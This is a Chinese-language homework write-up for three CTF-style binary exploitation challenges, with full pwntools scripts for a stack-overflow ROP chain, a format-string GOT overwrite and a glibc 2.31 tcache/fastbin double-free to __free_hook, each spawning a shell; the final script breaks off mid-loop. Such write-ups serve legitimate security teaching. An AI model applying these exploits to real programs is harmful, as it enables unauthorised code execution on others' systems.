# 软件安全hw1

# 软件安全 hw1
## pwn1

一道简单的栈溢出的题目，检查程序保护措施如下：

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- 无canary，可直接利用栈溢出。

- 无PIE，程序虚地址已知，可直接从源程序得到。
- 堆栈不可执行，无法直接执行写入的shellcode，考虑利用rop。
- Partial RELRO，got表部分可写，考虑ret2libc。

反编译二进制文件得到如下结果：

```C
int main(void)

{
  EVP_PKEY_CTX *in_RDI;
  char buf [48];
  
  init(in_RDI);
  puts("Show me your code :D");
  gets(buf);
  return 0;
}
```

在栈上分配了一个48 byte的buffer，利用gets读入数据，gets为一个常见的危险函数，其手册中描述如下：

```
gets()  
	  reads a line from stdin into the buffer pointed to by s until either a
    terminating newline or EOF, which it replaces with a null byte ('\0').
    No check for buffer overrun is performed (see BUGS below).
	   
BUGS
    Never use gets().  Because it is impossible to tell without knowing the
    data  in  advance  how  many  characters gets()  will  read,  and  
    because gets() will continue to store characters past the end of the 
    buffer, it is extremely dangerous to use.  It has been used to break 
    computer security.  Use fgets() instead.
```

即可以读入一段任意长度的数据，直接构造rop链进行利用。程序中没有直接可以用来拿shell的函数，需要在libc中找，考虑先利用puts获取libc的基址，再向bss段中写入`/bin/sh\x00`，然后以此为参数调用system函数。

由于我们需要利用到第一次地址泄露的结果才能知道system函数的地址，故在泄露地址后先返回到程序起始地址重新执行，这样在libc地址不变的情况下多了一次溢出的机会。

在64位程序中，前三个参数分别存放在`rdi`，`rbi`，`rdx`这几个寄存器当中，由于我们调用的这些函数均只用到了一个参数，故我们只需要一个`pop rdi; ret`的gadget，利用`ROPgadget`在文件中查找得其地址为`0x401283`。

```
~/.../SoftwareSecurity/hw1 >>> ROPgadget --binary pwn1 
Gadgets information
============================================================
0x00000000004010bd : add ah, dh ; nop ; endbr64 ; ret
0x00000000004010eb : add bh, bh ; loopne 0x401155 ; nop ; ret
0x000000000040128c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x000000000040120f : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000401210 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040115a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040128e : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004010bc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401211 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040115b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401212 : add cl, cl ; ret
0x00000000004010ea : add dil, dil ; loopne 0x401155 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401157 : add eax, 0x2f0b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x00000000004011d7 : call qword ptr [rax + 0xff3c35d]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401173 : cli ; jmp 0x401100
0x00000000004010c3 : cli ; ret
0x000000000040129b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401170 : endbr64 ; jmp 0x401100
0x00000000004010c0 : endbr64 ; ret
0x000000000040126c : fisttp word ptr [rax - 0x7d] ; ret
0x00000000004010be : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x00000000004010e5 : je 0x4010f0 ; mov edi, 0x404040 ; jmp rax
0x0000000000401127 : je 0x401130 ; mov edi, 0x404040 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401174 : jmp 0x401100
0x000000000040100b : jmp 0x4840103f
0x00000000004010ec : jmp rax
0x0000000000401213 : leave ; ret
0x00000000004010ed : loopne 0x401155 ; nop ; ret
0x0000000000401156 : mov byte ptr [rip + 0x2f0b], 1 ; pop rbp ; ret
0x000000000040120e : mov eax, 0 ; leave ; ret
0x00000000004010e7 : mov edi, 0x404040 ; jmp rax
0x00000000004010bf : nop ; endbr64 ; ret
0x00000000004011d8 : nop ; pop rbp ; ret
0x00000000004010ef : nop ; ret
0x000000000040116c : nop dword ptr [rax] ; endbr64 ; jmp 0x401100
0x00000000004010e6 : or dword ptr [rdi + 0x404040], edi ; jmp rax
0x0000000000401158 : or ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040127c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040127e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401280 : pop r14 ; pop r15 ; ret
0x0000000000401282 : pop r15 ; ret
0x000000000040127b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040127f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040115d : pop rbp ; ret
0x0000000000401283 : pop rdi ; ret
0x0000000000401281 : pop rsi ; pop r15 ; ret
0x000000000040127d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x000000000040129d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040129c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x00000000004010e3 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404040 ; jmp rax
0x0000000000401125 : test eax, eax ; je 0x401130 ; mov edi, 0x404040 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 66
```

偏移量可以直接从ghidra中读出，为`0x38`则我们可构造如下的payload：

|       Addr       |        Content         |
| :--------------: | :--------------------: |
|     buf[48]      | padding of length 0x30 |
|       rbp        |        padding         |
|     ret_addr     |        rdi_ret         |
|       arg1       |        puts@got        |
|  function call   |        puts@plt        |
| next instruction |       entry_addr       |

上述payload的效果为使得main函数在执行完后跳转到`rdi_ret`的地址继续执行，此时rsp指向我们布置在栈上的arg1，`pop rdi; ret`将`puts@got`存放到`rdi`中，然后跳转到`puts`的地址，最终的执行效果以`puts@got`为参数调用puts，即将`puts@got`处存放的内容以字符串的形式打印出来。`puts@got`中存放的是puts函数在libc中实际的地址，而我们知道puts在libc中的相对偏移，于是我们以这样的方式可以求得libc的基址，于是可以获知libc中所有函数的地址。puts执行完后将返回我们写在栈上的`entry_addr`，即从头开始执行程序，于是我们可以开始下一步的利用。

我们希望调用`system("/bin/sh\x00")`来getshell， 除了利用libc中现成的地址之外，我们也可以向bss段中的某个位置写入"/bin/sh\x00"，然后将该地址作为参数调用system。这里选用后一种方法。构造如下payload。

|       Addr       |        Content         |
| :--------------: | :--------------------: |
|     buf[48]      | padding of length 0x30 |
|       rbp        |        padding         |
|     ret_addr     |        rdi_ret         |
|       arg1       |       bss+0x100        |
|  function call   |        gets@plt        |
| next instruction |        rdi_ret         |
|       arg1       |       bss+0x100        |
|  function call   |         system         |

其工作的方式与之前类似，不再赘述，效果为先执行gets函数向`bss+0x100`地址处读入数据，可在下一步中写入任意想要执行的命令，例如`/bin/sh\x00`。然后以该地址为参数调用system，即可获得shell。完整的利用代码如下。

```python
from pwn import *

name = "pwn1"

elf = ELF(name)

# libc = ELF("libc-2.31-dbg.so")
libc = ELF("/usr/lib/libc.so.6")

context(arch='amd64', terminal = ['konsole', '-e', 'zsh', '-c'], log_level = 'debug')

# p = process(['./ld-2.31-dbg.so', "./pwn1"], env = {"LD_PRELOAD": "./libc-2.31-dbg.so"})
p = elf.process()

# gdb.attach(p, gdbscript="c\n")
p.recvuntil(b':D\n')
rdi_ret = 0x401283
payload = cyclic(0x38)
payload += p64(rdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.entry)
p.sendline(payload)
l = p.recvuntil(b'\x0a',drop = True)
puts_got = u64(l.ljust(8, b'\x00'))
libc_addr = puts_got - libc.sym['puts']


log.info("libc=>{:x}".format(libc_addr))
p.recvuntil(b':D\n')
bss_addr = elf.bss() + 0x100
payload = cyclic(0x38)
payload += p64(rdi_ret)
payload += p64(bss_addr)
payload += p64(elf.plt['gets'])
# payload += p64(0)
payload += p64(rdi_ret)
payload += p64(bss_addr)
payload += p64(libc_addr + libc.sym['system'])

# one_gadgets = [0xcbcb1, 0xcbcb4, 0xcbcb7]
# payload = cyclic(0x38)
# payload += p64(libc_addr + one_gadgets[2])
p.sendline(payload)
p.sendline(b'/bin/sh\x00')
p.interactive()
```

## pwn2_32

简单的32位格式化字符串漏洞，程序保护机制如下：

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

- 无PIE，可以直接静态分析得知各指令的地址。
- canary开启，无法简单利用栈溢出。
- NX开启，堆栈不可执行。
- Partial RELRO，可部分覆盖got表，考虑ret2libc。

main函数逻辑如下：

```C
int main(int argc)

{
  uint uVar1;
  __uid_t __euid;
  __uid_t __ruid;
  int iVar2;
  int in_GS_OFFSET;
  char local_78 [100];
  int local_14;
  int *local_10;
  
  local_10 = &argc;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  __euid = geteuid();
  __ruid = geteuid();
  setreuid(__ruid,__euid);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  uVar1 = secret;
  puts("Show me your password. ");
  printf("Password:");
  fgets(local_78,100,stdin);
  iVar2 = strcmp(local_78,"sec21.\n");
  if (iVar2 == 0) {
    puts("Password OK :)");
  }
  else {
    handle_failure(local_78);
  }
  if (uVar1 != secret) {
    puts("The secret is modified!\n");
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

即读入一个长度为100的字符串(无溢出)，比较是否为`"sec21.\n"`，若是则打印成功信息，然后检查某全局变量是否已经被修改，如果不是则调用handle_failure。这从两个分支来看，若password正确没有任何操作的空间，我们情愿选择一个错误的password。

观察handle_failure这个函数：

```C
void handle_failure(char *buf)

{
  int iVar1;
  int in_GS_OFFSET;
  char msg [100];
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  snprintf(msg,100,"Invalid Password! %s\n",buf);
  printf(msg);
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

将buf中的内容和打印到msg中，然后利用printf打印。很明显的格式化字符串漏洞，可以任意地址读写，问题是怎么利用。由于只有一次改写的机会，而一开始我们是不知道栈上的地址的，那么确定的就只有got表的地址。printf执行完之后程序中唯一有可能执行的libc中的函数就只有全局变量secret被改变后用来打印信息的puts了，那我们就改这个puts，此外还需要改secret的值。

为了能够执行任意代码，显然我们还需要另一次的攻击，需要将rip设置为读取字符串前的某一个位置。将puts@got的值改为entry并不合适，因为在main函数开头还有puts的调用，将导致死循环。fgets调用前的位置是合适的。将puts指向该位置，即可得到再一次执行的机会。

仅仅能够再次执行还不够，第一次的漏洞利用我们除了多执行一次的机会之外什么都没做，有些浪费。在改got表的同时我们还可以泄露出strcmp的地址，从而计算出system的地址，留待后续攻击中使用。

总结一下，在第一次的格式化字符串漏洞利用中，我们需要：

1. 改写secret的值。
2. 改写puts@got为`0x80488e9`。
3. 泄露strcmp的地址。

主要思路仍然为ret2libc。main函数中strcmp的第一个参数为我们的输入，考虑将strcmp@got的值改写为system的地址，即可在下一次调用时执行任意命令。

完整的exp如下。

```python
from pwn import *

name = "pwn2_32"

elf = ELF(name)

# libc = ELF("libc-2.31-dbg.so")
libc = ELF("/usr/lib32/libc-2.33.so")

context(arch='i386', terminal = ['konsole', '-e', 'zsh', '-c'], log_level = 'info')

# p = process(['./ld-2.31-dbg.so', "./pwn1"], env = {"LD_PRELOAD": "./libc-2.31-dbg.so"})

p = elf.process()
# gdb.attach(p, gdbscript="b*0x8048847\nc\n")
offset = 15
secret = 0x804a050
print_key = 0x08048726
target = elf.entry

puts_addr = elf.got['puts']
payload = b"bb"
payload += p32(secret) #0x18
payload += p32(elf.got['puts'] + 2)
payload += p32(elf.got['puts'])
payload += p32(elf.got['strcmp'])
payload += b"%15$n"
payload += "%{}c".format(0x804 - 0x24).encode()
payload += b"%16$hn"
payload += "%{}c".format(0x88e9 - 0x804).encode()
payload += b"%17$hn"
payload += b"_"
payload += b"%18$s"

p.sendline(payload)
p.recvuntil(b"_")
strcmp_addr = u32(p.recv(4))
log.info("strcmp_addr=>{:x}".format(strcmp_addr))
libc_addr = strcmp_addr - libc.sym['__strcmp_sse4_2']
log.info("libc_addr=>{:x}".format(libc_addr))
system_addr = libc_addr + libc.sym['system']
log.info("system_addr=>{:x}".format(system_addr))

payload = b"bb"
payload += p32(elf.got['strcmp'] + 2)
payload += p32(elf.got['strcmp'])
payload += "%{}c".format((system_addr & 0xffff) - 0x1c).encode()
payload += b"%16$hn"
payload += "%{}c".format((system_addr >> 16) - (system_addr & 0xffff)).encode()
payload += b"%15$hn"

p.sendline(payload)
log.info("puts_got=>{:x}".format(elf.got['puts']))
log.info("strcmp_got=>{:x}".format(elf.got['strcmp']))
p.sendline("/bin/sh\x00")
p.interactive()

```

## pwn3

菜单堆，乍看貌似没那么基础，不过做完之后感觉确实也还是蛮基础。

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

64位，保护全开。

- Full RELRO，got表没法写。
- PIE，got和plt在哪都不知道。
- NX，Canary开启。
- FORTIFY，之前没见过，网上查了一下，大致功能如下：FORTIFY_SOURCE是GCC和GLIBC安全功能，它尝试检测某些类型的缓冲区溢出。默认在大多数Linux平台上启用。使用FORTIFY_SOURCE选项时，如果编译器可以推断出目标缓冲区的大小，则编译器将插入代码以调用不安全函数的“更安全”变体。不安全功能包括memcpy，mempcpy，memmove，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf和gets。

回到题目，main函数如下：

```C
void main(EVP_PKEY_CTX *param_1)

{
  int iVar1;
  
  init(param_1);
  do {
    while( true ) {
      while( true ) {
        menu();
        iVar1 = read_int();
        if (iVar1 != 3) break;
        delete();
      }
      if (iVar1 < 4) break;
LAB_00101788:
      puts("Invalid choice.");
    }
    if (iVar1 == 1) {
      add();
    }
    else {
      if (iVar1 != 2) goto LAB_00101788;
      list();
    }
  } while( true );
}
```

实际提供了3各选项，分别为add，delete和list，分别如下：

- add

  ```C
  void add(void)
  
  {
    uint uVar1;
    char *pcVar2;
    int local_10;
    
    local_10 = 0;
    while( true ) {
      if (9 < local_10) { // 最多只能有10个note
        puts("Full!");
        return;
      }
      if ((notes[local_10].content == (char *)0x0) || (*(int *)&notes[local_10].avalable != 0)) break;// 检查content是否为0，即是否还没有初始化过。available域是否为0，在add时会将其置0， 标识其已经占用，delete后置1，标识可用。
      local_10 = local_10 + 1;
    }
    printf("Size: ");
    uVar1 = read_int();
    if (0x78 < uVar1) {// 限制了分配的堆块大小，没有超过fastbin的范围
      puts("Too big!");
      return;
    }
    pcVar2 = (char *)malloc((ulong)uVar1);
    notes[local_10].content = pcVar2;
    memset(notes[local_10].content,0,(ulong)uVar1);// 清空原有内容
    printf("Note: ");
    read_input(notes[local_10].content,uVar1 - 1,uVar1 - 1);
    printf("Description of this note: ");
    __isoc99_scanf("%48s",(long)local_10 * 0x40 + 0x104070,(long)local_10 * 0x40 + 0x10);//向note结构体中的description域读入48个byte，此处存在off by one，末尾的\x00可能溢出，刚好可以覆盖掉下一个note的avilable域。这是我发现的唯一一个突破口。
    *(undefined4 *)&notes[local_10].avalable = 0;
    puts("Done!");
    return;
  }
  ```

- delete

  ```C
  void delete(void)
  
  {
    int iVar1;
    ulong idx;
    
    printf("Which note do you want to delete?\nIndex: ");
    iVar1 = read_int();
    idx = SEXT48(iVar1);
    if (idx < 10) {//无符号数比较，没有利用空间
      if (notes[idx].content == (char *)0x0) {
        puts("No such note!");
      }
      else {
        if (*(int *)&notes[idx].avalable != 0) { //意思是只要把available置为0即可double free，但是还需要注意libc中的检查。
          puts("Double free! Bad hacker :(");
                      /* WARNING: Subroutine does not return */
          _exit(-1);
        }
        free(notes[idx].content);
        *(undefined4 *)&notes[idx].avalable = 1;
      }
    }
    else {
      puts("Invalid index.");
    }
    return;
  }
  ```

- list

  ```C
  void list(void)
  
  {
    uint local_c;
    
    local_c = 0;
    while ((int)local_c < 10) {
      if ((notes[(int)local_c].content != (char *)0x0) && (*(int *)&notes[(int)local_c].avalable == 0)//若通过off by one将其置为0， 则可以打印释放掉的内存中的值，依次泄露地址。
         ) {
        printf("Note %d:\n  Data: %s\n  Desc: %s\n",(ulong)local_c,notes[(int)local_c].content,
               (long)(int)local_c * 0x40 + 0x104070);
      }
      local_c = local_c + 1;
    }
    puts("");
    return;
  }
  ```

以上便是整个程序中的全部内容。其中结构体note的结构如下：

```C
struct note {
    long available;
    char *content;
    char[48] description;
}
```

对于这样一个保护全开的程序，首要任务是泄露地址，否则其他什么事情都干不了。能够分配的最大的堆块为0x80，会首先放入tcache_bin中，直到填满7个，之后的会放入fastbin中。在2.31中，这两条单链表上都会进行double free的检查，简单的double free难以奏效，考虑先将某个堆块放到fastbin之后，再将其free到tcache bin中，这样以来就能够两次分配到同一块内存地址。在这之前，可以利用list的检查机制，打印出free掉的块中的内容，以此泄露heap地址。具体如下：

先将所有的note都分配然后再free掉，此时所有的堆块都填充在tcache bin和fastbin中。

按照chunk的结构，malloc得到的地址中的内容为链表中下一个chunk的地址。我们add一个堆块note[0]，并将其descryption域填满48字节，覆盖下一chunk的available域，使得下一次list时将note[1]识别为已分配的note，打印出其content的内容，即泄露出堆上的地址。

但是仅有堆上的地址还不够，为了能够实现攻击，我们至少需要程序的地址或者libc的地址。在堆内，有办法通过unsorted bin得到main_arena的地址，但是此处给我们的最大堆块为0x80，没有超过fastbin的范围。考虑想办法破坏堆块的管理结构，例如覆盖下一个堆块的size域，伪造一个大堆块，然后把它free掉，从而将其放入`unsorted bin`中。为达到这一目的，我们需要能够写到某个chunk之前的0x10个字节，程序中并没有这样的溢出漏洞可以利用，只能从double free上想办法。

整体思路如下，将一个victim chunk放入fastbin中，然后通过其前一个note的description覆盖掉该note的available字段，再free依次这个chunk。此时由于tcachebin中有空，能够将victim放入tcache中，从而不会触发double free的检查。接下来，再次分配一块内存，将会将victim取出。注意到由于此时victim仍然处于fasbin的链中，victim的内容将会识别为fastbin中的管理结构，即其下一个堆块的地址，因此我们可以在此写入一个地址，这个地址将被识别为一个堆块的地址插入到fastbin的链表中，能够再将来的某次malloc中被返回。

我们之前说过想要改写某个chunk的size字段，我们可以通过上述方法返回的任意地址来向一个size字段中写入一个大于0x400的大小，从而实现我们的攻击。我们可以选择分配一个堆块内部的地址，写入内容时覆盖下一个堆块的size域。或者我们也可以通过构造使得返回的这个地址变成一个size大于0x400的chunk。我们将被修改size字段的chunk称为victim1。

在具体的操作中，如果直接随意选择一个堆块作为victim1，将会面临一个严重的问题。由于我们最终需要释放掉这个victim1，必须使这个堆块看起来像一个合法的堆块，而在释放时，这一版本的libc会检查`(chunk + size)-> previnuse == 1`，即根据堆块大小计算出下一个堆块的位置，并检查那里的previnuse位。而我们如果一共分配10个堆块，每个堆块大小为0x80的话，则共计有0x500的空间，而我们需要一个0x4*0之后的位置上的previnuse位。起初我没有考虑利用其他大小的堆块来扩充范围，选择了通过排列堆块来使得我们double free掉的堆块正好位于整个0x500空间中靠前的位置。

由于tcache时LIFO，首先通过两对add和delete，使得前两个堆块换位。即

| idx  | available | content_addr | descryption |
| :--: | :-------: | :----------: | :---------: |
|  0   |     0     |    chunk1    |     ...     |
|  1   |     0     |    chunk0    |     ...     |

然后分配并逆序释放掉所有的堆块:

| idx  | available | content_addr | content_content | descryption |
| :--: | :-------: | :----------: | :-------------: | :---------: |
|  0   |     1     |    chunk1    |     chunk0      |      -      |
|  1   |     1     |    chunk0    |     chunk2      |      -      |
|  2   |     1     |    chunk2    |        -        |      -      |
|  3   |     1     |    chunk3    |     chunk4      |      -      |
|  4   |     1     |    chunk4    |     chunk5      |      -      |
|  5   |     1     |    chunk5    |     chunk6      |      -      |
|  6   |     1     |    chunk6    |     chunk7      |      -      |
|  7   |     1     |    chunk7    |     chunk8      |      -      |
|  8   |     1     |    chunk8    |     chunk9      |      -      |
|  9   |     1     |    chunk9    |        -        |      -      |

此时根据我们释放的顺序，chunk0位于fastbin中，具体如下：

{{< mermaid >}}
graph LR;
tcache:-->chunk3
chunk3-->chunk4
chunk4-->chunk5
chunk5-->chunk6
chunk6-->chunk7
chunk7-->chunk8
chunk8-->chunk9
fastbin:-->chunk1
chunk1-->chunk0
chunk0-->chunk2
{{< /mermaid >}}

这时我们执行add并溢出下一个note，得到的结果为：

| idx  | available | content_addr | content_content | descryption |
| :--: | :-------: | :----------: | :-------------: | :---------: |
|  0   |     0     |    chunk3    |        -        | cyclic(48)  |
|  1   |     0     |    chunk0    |     chunk2      |      -      |

这样我们通过list就可以得到chunk2的地址。

此时我们再执行delete(1)，可以讲chunk0插回到tcachebin中，使之称为下一次malloc分配的地址，与此同时再fastbin中还呆着一个chunk0。

{{< mermaid >}}
graph LR;
tcache:-->chunk0
chunk0-->chunk4
chunk4-->chunk5
chunk5-->chunk6
chunk6-->chunk7
chunk7-->chunk8
chunk8-->chunk9
fastbin:-->chunk1
chunk1-->chunk0
chunk0-->somewhere
{{< /mermaid >}}

在下一次的add中，我们可以向chunk0中写入一个地址，这样fastbin中的chunk0的下一chunk即为我们写入的地址所代表的chunk。

我们之前已经泄露了chunk2的地址，chunk0和chunk2之间相差了0x100，我选择使chunk0->next指向chunk2-0xe0，即chunk0 + 0x20，我们这里是在写chunk0，故可以同时修改chunk0 + 0x18为我们想要的chunk size。为满足前文所说的检查需要，我们选择将chunk size设置为0x461，这样以来其下一个块的位置就在`chunk0 + 0x20 + 0x460`处，0x480恰为0x80的整数倍，即那个位置也有一个堆块，届时可以满足previnuse的要求。

至此我们利用double free得到了一个大小为0x460的堆块。

| idx  | available | content_addr | content_content | descryption |
| :--: | :-------: | :----------: | :-------------: | :---------: |
|  0   |     0     |    chunk1    |        -        | cyclic(48)  |
|  1   |     0     |    chunk0    |  chunk0 + 0x20  |      -      |

{{< mermaid >}}
graph LR;
tcache-->chunk4
chunk4-->chunk5
chunk5-->chunk6
chunk6-->chunk7
chunk7-->chunk8
chunk8-->chunk9
fastbin:-->chunk1
chunk1-->chunk0
chunk0-->chunk0+0x20
{{< /mermaid >}}

我们希望利用构造出来的这个堆块，以有机会将其释放掉，故分配了剩余的所有note。注意这里又一个细节，除了之前两个分配过的块，这里还有8个块要分配。前六个是tcache中的块，在拿出fastbin中的第一个块之后，会将剩余的块逆序插入到tcache内，从而使得chunk0 + 0x20先于chunk0被分配，使得我们有了利用该块的机会。

| idx  | available | content_addr  | content_content | descryption |
| :--: | :-------: | :-----------: | :-------------: | :---------: |
|  0   |     0     |    chunk3     |        -        |      -      |
|  1   |     0     |    chunk0     |        -        |      -      |
|  2   |     0     |    chunk4     |        -        |      -      |
|  3   |     0     |    chunk5     |        -        |      -      |
|  4   |     0     |    chunk6     |        -        |      -      |
|  5   |     0     |    chunk7     |        -        |      -      |
|  6   |     0     |    chunk8     |        -        |      -      |
|  7   |     0     |    chunk9     |        -        |      -      |
|  8   |     0     |    chunk1     |        -        |      -      |
|  9   |     0     | chunk0 + 0x20 | main_arena + 96 |      -      |

于是现在我们可以delete(9)，将这个chunk放到unsorted bin中。此时有了下一个问题：怎么把它读出来？一种想法是delete(8)之后分配回来，利用溢出使得9变成可读状态，但是实际操作之后发现此时delete(8)会遇到问题，在add(9)时根据程序逻辑清空了分配到的地址中等于size大小的内存，而此处我们不得不分配0x80大小的块以选择合适的tcache用于取出大堆块，需要采用其他的方法读出这已经到了嘴边的libc地址。

在分配一块新的内存地址时，如果unsorted bin中有大堆块，会优先从中拆分出一个小块，我们可以利用这一特性改变libc地址的位置。在delete(9) 之后，分配一个0x60大小的堆块，则unsorted bin中残留的堆块会被抬升到chunk0 + 0x80，即chunk1的位置，而这恰好是note 8的content指向的地址。此时list得到的Note 8的content就是libc中的地址。调试代码知其指向main_arena + 96的位置，反推得到libc的基址。

下一步便是故技重施，通过double free分配任意内存，进而执行命令了。由于破坏了堆块的结构，已经不是所有的note都可用了。试验后发现note1一旦释放就会crash掉，我们只能对剩下的note进行有限的操作。我们先释放掉所有的堆块。

| idx  | available | content_addr  | content_content | descryption |
| :--: | :-------: | :-----------: | :-------------: | :---------: |
|  0   |     1     |    chunk3     |        -        |      -      |
|  1   |     0     |    chunk0     |        -        |      -      |
|  2   |     1     |    chunk4     |        -        |      -      |
|  3   |     1     |    chunk5     |        -        |      -      |
|  4   |     1     |    chunk6     |        -        |      -      |
|  5   |     1     |    chunk7     |        -        |      -      |
|  6   |     1     |    chunk8     |        -        |      -      |
|  7   |     1     |    chunk9     |        -        |      -      |
|  8   |     1     |    chunk1     |        -        |      -      |
|  9   |     1     | chunk0 + 0x20 | main_arena + 96 |      -      |

此时链表中内容如下：

{{< mermaid >}}
graph LR;
tcache:0x60-->chunk0+0x20
tcache:0x80-->chunk8
chunk8-->chunk7
chunk7-->chunk6
chunk6-->chunk5
chunk5-->chunk4
chunk4-->chunk3
chunk3-->chunk0
fastbin:0x80-->chunk9
unsorted_bin:0x400-->chunk1
{{< /mermaid >}}

这时chunk9位于fastbin中，我们希望对其进行double free，其地址当前位于note7中，note1已处于不可用状态，我们只要分配前面的5个note之后，就可以对note6进行更改，通过溢出对note7进行double free。我们选择向note7中写入\_\_free\_hook - 0x10，这样当malloc此堆块时即可修改\_\_free\_hook的值。

如上操作后，分配剩余的两个note，此时我们发现遇到了问题。所有的note都用完了，但是还是没能得到\_\_free\_hook。这个chunk恰好留在tcache bin中。

| idx  | available | content_addr | content_content | descryption |
| :--: | :-------: | :----------: | :-------------: | :---------: |
|  0   |     0     |    chunk8    |        -        |      -      |
|  1   |     0     |    chunk0    |        -        |      -      |
|  2   |     0     |    chunk7    |        -        |      -      |
|  3   |     0     |    chunk6    |        -        |      -      |
|  4   |     0     |    chunk5    |        -        |      -      |
|  5   |     0     |    chunk4    |        -        |      -      |
|  6   |     0     |    chunk3    |        -        |      -      |
|  7   |     0     |    chunk9    |        -        |      -      |
|  8   |     0     |    chunk0    |        -        |      -      |
|  9   |     0     |    chunk9    |        -        |      -      |

链表状态如下

{{< mermaid >}}
graph LR;
tcache:0x60-->chunk0+0x20
tcache:0x80-->__free_hook
unsorted_bin:0x400-->chunk1
{{< /mermaid >}}

看似无解。苦思一番之后发现可以利用总是先从tcache中取chunk的特点，把note用tcache腾出来，会有几个堆块挤到fastbin里去，再次分配时\_\_free\_hook就有机会被分配出去了。后续的工作就很显然了，向一个堆块chunk\*中写入"/bin/sh\x00"，同时向__free_hook中写入system的地址，接下来free chunk\*，free中调用\_\_free\_hook指向的函数，即可最终执行system("/bin/sh\x00")。

完整的exp如下：

```python
from pwn import *

name = "pwn3"

elf = ELF(name)

libc = ELF("./libc-2.31-dbg.so")
# context(arch='amd64', terminal = ['konsole', '-e', 'zsh', '-c'], log_level = 'debug')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process(["./ld-2.31-dbg.so", "./pwn3"], env = {"LD_PRELOAD":"./libc-2.31-dbg.so"})
# p = elf.process()

# p = process(["/glibc/2.23/64/lib/ld-2.23.so", "./pwn3"], env = {"LD_PRELOAD":"/glibc/2.23/64/lib/ld-2.23.so"})
# gdb.attach(p, gdbscript = "b*system\nset follow-fork-mode child\nc\n")
# gdb.attach(p)
# upper bound: 10 notes
# max size: 0x78
def add_note(size, content, desc):
    p.sendlineafter(b"> \n", b"1")
    p.sendlineafter(b"Size: ", str(size))
    p.sendlineafter(b"Note: ", content)
    p.sendlineafter(b"note: ", desc)
    p.recvuntil(b"Done!")

def list_note():
    p.sendlineafter(b"> \n", b"2")
    # print(p.recvuntil(b"\n\n"))

def del_note(idx):
    p.sendlineafter(b"> \n", b"3")
    p.sendlineafter("Index: ", str(idx))

for i in range(2):
    add_note(0x78, cyclic(4), str(i) * 4)

for i in range(2):
    del_note(i)

for i in range(10):
    add_note(0x78, str(i) * 4, str(i) * 4)

for i in reversed(range(10)):
    del_note(i)

add_note(0x78, "0000", cyclic(48))

list_note()
p.recvuntil(b"1:\n  Data: ")

addr = u64(p.recvuntil(b"\n", drop = True).ljust(8, b"\x00"))
log.info("addr=>0x{:x}".format(addr))
# addr of 2
del_note(1)
add_note(0x78, p64(addr-0xe0) + b'\x00' * 16 + b'\x61\x04', cyclic(48-1)) # 1

for i in range(2, 10):
    add_note(0x78, str(i) * 4, str(i) * 4)
    
del_note(9)
add_note(0x50, "9999", cyclic(48-1))
list_note()
p.recvuntil(b'Note 8:')
p.recvuntil(b'Data: ')
addr = u64(p.recvuntil(b'\n',drop = True).ljust(8, b'\x00'))
p.recvuntil(b'\n\n')
main_arena_addr = addr - 96
libc_addr = main_arena_addr - libc.sym['main_arena']
log.info("libc_addr=>{:x}".format(libc_addr))

alive = [0, 2, 3, 4, 5, 6, 7, 8, 9]
for i in alive:
    del_note(i)
for i in range(5):
